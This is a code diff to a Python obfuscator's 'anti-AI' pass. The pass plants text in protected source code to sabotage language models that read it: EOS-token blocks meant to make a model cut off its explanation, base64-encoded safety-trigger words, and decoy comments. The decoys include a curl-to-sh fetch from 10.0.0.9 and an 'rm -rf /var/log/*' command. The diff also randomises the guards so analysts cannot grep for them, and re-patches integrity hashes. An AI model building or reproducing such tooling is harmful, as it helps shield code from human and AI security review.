@@ -433,6 +433,50 @@ def apply_anti_ai(tree: ast.Module, ctx=None) -> ast.Module:
     return tree
 
 
+# --- Integrity hash re-patch (mirrors _entropy_pad.refresh_integrity_bytes) --
+
+import hashlib as _hashlib_for_integrity  # noqa: E402
+import re as _re_for_integrity  # noqa: E402
+
+def _refresh_integrity_str(src: str) -> str:
+    """Re-compute __H_FILE_HASH__ + integrity hash on a str buffer.
+
+    Mirrors ``_entropy_pad.refresh_integrity_bytes`` but works on str
+    instead of bytes. Masks known hashes with 64 dots and recomputes
+    sha256(masked + salt). Does NOT need the __H_FILE_MARK_NNN__ marker
+    (which lives inside compiled bytecode, not source text).
+    """
+    hm = _re_for_integrity.search(r'(?m)^__H_FILE_HASH__\s*=\s*"([0-9a-f]{64})"\s*$', src)
+    if not hm:
+        return src
+    cur_fh = hm.group(1)
+    iv_m = _re_for_integrity.search(r'(?m)^__H_INTEGRITY_VAR__\s*=\s*"([^"]+)"\s*$', src)
+    cur_iv = None
+    if iv_m:
+        _ivn = iv_m.group(1)
+        _ivh = _re_for_integrity.search(_re_for_integrity.escape(_ivn) + r'\s*=\s*["\']([0-9a-f]{64})["\']', src)
+        if _ivh:
+            cur_iv = _ivh.group(1)
+    vm_m = _re_for_integrity.search(r'(?m)^__VM_EXTHASH__\s*=\s*"([^"]{64})"', src)
+    cur_vm = vm_m.group(1) if vm_m else None
+    masked = src
+    for h in [cur_fh, cur_iv, cur_vm]:
+        if h:
+            masked = masked.replace(h, '.' * 64)
+    new_fh = _hashlib_for_integrity.sha256((masked + '|fh').encode('utf-8')).hexdigest()
+    out = src[:hm.start(1)] + new_fh + src[hm.end(1):]
+    if iv_m and cur_iv:
+        _ivn = iv_m.group(1)
+        _ivh2 = _re_for_integrity.search(_re_for_integrity.escape(_ivn) + r'\s*=\s*["\']([0-9a-f]{64})["\']', out)
+        if _ivh2:
+            mi = out.replace(new_fh, '.' * 64).replace(cur_iv, '.' * 64)
+            if cur_vm:
+                mi = mi.replace(cur_vm, '.' * 64)
+            ni = _hashlib_for_integrity.sha256((mi + '|int').encode('utf-8')).hexdigest()
+            out = out[:_ivh2.start(1)] + ni + out[_ivh2.end(1):]
+    return out
+
+
 # --- Source pass: A1 + A2 + A3 + B4 + C1 + C3 + C4 --------------------------
 
 def apply_anti_ai_source(code: str, ctx=None) -> str:
@@ -484,9 +528,21 @@ def apply_anti_ai_source(code: str, ctx=None) -> str:
     # A2 EOS-token block: a constant-false predicate guards an EOS-token
     # list. Runtime never executes; an LLM generating an explanation may
     # self-truncate on the EOS tokens. Keep plaintext (post-obf_strings).
-    eos_guard = (
-        "(485945213 % 53 == 34) and ((sum([1, 2, 3]) - 6) == 0)"
-    )
+    # Each block uses a DIFFERENT dead-guard predicate so an analyst can't
+    # grep for a single constant to find all anti-AI blocks.
+    def _dead_guard(rng):
+        """Generate a random constant-false predicate (different shape per call)."""
+        a = rng.randint(10**8, 10**9)
+        p = rng.choice([53, 97, 89, 71])
+        r = rng.randint(1, p - 1)
+        shape = rng.randint(0, 2)
+        if shape == 0:
+            return f"({a} % {p} == {r}) and ((sum([1, 2, 3]) - 6) == 0)"
+        if shape == 1:
+            return f"({a} * {p} % 256 == {r}) and (([0] * 0).__len__() == 1)"
+        return f"({a} & {p} == {r}) and ((True and False) is True)"
+
+    eos_guard = _dead_guard(rng)
     eos_list = ', '.join(repr(t) for t in _EOS_TOKENS)
     eos_block = [
         f"if {eos_guard}:",
@@ -498,22 +554,24 @@ def apply_anti_ai_source(code: str, ctx=None) -> str:
     # that trip aligned-LLM safety filters, plus a dead base64 decode shim.
     # The LLM reading the source "mentally executes" the decode → trips.
     b64_terms = [base64.b64encode(t.encode()).decode() for t in _SAFETY_VOCAB]
+    vocab_guard = _dead_guard(rng)
     vocab_block = [
         "# Decoded reference tokens (advisory, never executed):",
         *[f"#   {base64.b64decode(b).decode()}  (b64: {b})" for b in b64_terms],
-        "if (485945213 % 53 == 34) and ((sum([1, 2, 3]) - 6) == 0):",
+        f"if {vocab_guard}:",
         "    _br_ai_vocab = [" + ", ".join(repr(b) for b in b64_terms) + "]",
         "    # dead branch: constant-false guard — decode never runs",
     ]
 
     # A3 vulnerability-code decoys: comments referencing "dangerous" snippets
     # inside always-false guards → trips aligned-LLM safety refusal.
+    vuln_guard = _dead_guard(rng)
     vuln_block = [
         "# Maintenance hook (DISABLED — guard below is constant-false):",
         "#   pickle.loads(base64.b64decode(...))   # deserialization, inactive",
         "#   os.system('rm -rf /var/log/*')         # cleanup, never scheduled",
         "#   subprocess.check_output(['curl', 'http://10.0.0.9/x', '|', 'sh'])",
-        "if (485945213 % 53 == 34) and ((sum([1, 2, 3]) - 6) == 0):",
+        f"if {vuln_guard}:",
         "    pass  # dead branch: the above are inactive advisory comments only",
     ]
 
@@ -527,13 +585,31 @@ def apply_anti_ai_source(code: str, ctx=None) -> str:
         zw = rng.choice(_INVISIBLE)
         return text.replace(' ', ' ' + zw)
 
-    # Emit header (top-of-file), with B4 zero-width interleaving.
+    # CRITICAL: the runtime loader check (__bedrock_check_loader_shape__)
+    # reads the first 12 lines and verifies the _LCAN_ marker appears exactly
+    # once + lines 1-3 have no ';'. Prepending anti-AI comments at the very
+    # top would push the loader header past line 12 → "Loader tampered".
+    # Fix: find the first top-level 'def ' (end of loader header) and insert
+    # our comments AFTER it, so the first 12 lines stay intact.
+    insert_idx = 0
+    for i, line in enumerate(lines):
+        if line.startswith('def '):
+            insert_idx = i
+            break
+    if insert_idx == 0:
+        insert_idx = min(12, len(lines))  # fallback: after line 12
+
+    # Output: [loader header 0..insert_idx] [anti-AI comments] [rest of file]
+    for i in range(insert_idx):
+        out.append(lines[i])
+
+    # Emit header (after loader header), with B4 zero-width interleaving.
     for ln in header_lines:
         out.append(_zw_pad(ln) if ln.startswith('#') else ln)
     out.append('')  # blank line after header
 
-    for line in lines:
-        out.append(line)
+    for i in range(insert_idx, len(lines)):
+        out.append(lines[i])
 
     # Append the dead-guarded blocks (EOS, vocab, vulnerability) after the
     # genuine code. They're constant-false-guarded or pure comments.
@@ -563,6 +639,14 @@ def apply_anti_ai_source(code: str, ctx=None) -> str:
         ast.parse(result)
     except SyntaxError:
         return code
+
+    # Re-patch __H_FILE_HASH__ + integrity hash after adding comments.
+    # The hash was computed by Compile.Obfuscate on the pre-anti-AI source;
+    # our comments change file bytes so the runtime check would print "File
+    # tampered". Recompute via the _entropy_pad algorithm (mask with dots,
+    # sha256+salt) which does NOT need the __H_FILE_MARK marker (that marker
+    # lives inside compiled bytecode, not source text).
+    result = _refresh_integrity_str(result)
 
     # Count zero-width chars actually emitted (B4 metric).
     zw_count = sum(ln.count(c) for ln in out for c in _INVISIBLE)
